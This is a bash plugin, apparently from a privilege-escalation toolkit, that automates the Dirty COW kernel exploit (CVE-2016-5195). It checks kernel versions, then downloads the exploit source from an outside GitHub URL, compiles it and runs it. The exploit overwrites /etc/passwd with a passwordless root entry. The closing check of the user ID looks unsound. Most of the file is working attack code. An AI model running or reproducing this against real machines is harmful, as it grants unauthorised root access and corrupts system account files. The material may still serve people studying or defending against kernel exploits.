#!/bin/bash
# Dirty COW (CVE-2016-5195) Plugin
PLUGIN_NAME="dirtycow"
PLUGIN_VERSION="1.0.0"
PLUGIN_CVE="CVE-2016-5195"
PLUGIN_DESCRIPTION="Dirty COW - Kernel Race Condition Privilege Escalation"

dirtycow_detect() {
    log_message "Checking for Dirty COW vulnerability..." "INFO"
    local major=$KERNEL_MAJOR
    local minor=$KERNEL_MINOR
    local patch=$KERNEL_PATCH
    
    if [ "$major" -lt 4 ]; then
        if [ "$major" -gt 2 ] || ([ "$major" -eq 2 ] && [ "$minor" -ge 6 ] && [ "$patch" -ge 22 ]); then
            log_message "System VULNERABLE to Dirty COW" "WARNING"
            return 0
        fi
    elif [ "$major" -eq 4 ] && [ "$minor" -lt 8 ]; then
        log_message "System VULNERABLE to Dirty COW" "WARNING"
        return 0
    fi
    
    log_message "System NOT vulnerable to Dirty COW" "INFO"
    return 1
}

dirtycow_exploit() {
    log_message "Attempting Dirty COW exploitation..." "INFO"
    
    if ! dirtycow_detect; then
        return 1
    fi
    
    local exploit_source="${EXPLOIT_DIR}/dirtyc0w.c"
    local exploit_binary="${EXPLOIT_DIR}/dirtycow"
    local exploit_url="${EXPLOIT_SOURCES[dirtycow]}"
    
    [ -z "$exploit_url" ] && exploit_url="https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c"
    
    if ! download_exploit "dirtycow" "$exploit_url" "$exploit_source"; then
        log_message "Failed to download Dirty COW exploit" "WARNING"
        return 1
    fi
    
    if ! compile_exploit "$exploit_source" "$exploit_binary"; then
        log_message "Failed to compile Dirty COW exploit" "WARNING"
        return 1
    fi
    
    if [ $SAFE_MODE -eq 1 ]; then
        cp /etc/passwd "${BACKUP_DIR}/passwd.dirtycow.bak" 2>/dev/null || true
    fi
    
    log_message "Running Dirty COW exploit..." "INFO"
    timeout_exec $TIMEOUT_CRITICAL "$exploit_binary" /etc/passwd "root::0:0:root:/root:/bin/bash" 2>/dev/null &
    spinner $!
    wait $! 2>/dev/null
    
    sleep 2
    if [ "$(id -u)" -eq 0 ]; then
        log_message "Dirty COW exploit SUCCESSFUL!" "SUCCESS"
        return 0
    fi
    
    log_message "Dirty COW exploit failed" "WARNING"
    return 1
}

dirtycow_info() {
    cat << 'EOFINFO'
Dirty COW (CVE-2016-5195)
=========================
A race condition in the Linux kernel's copy-on-write mechanism
that allows unprivileged users to gain write access to read-only
memory mappings.

Affected: Linux kernel 2.6.22 < 4.8.0
Impact: Local privilege escalation to root
Discovery: Phil Oester
EOFINFO
}
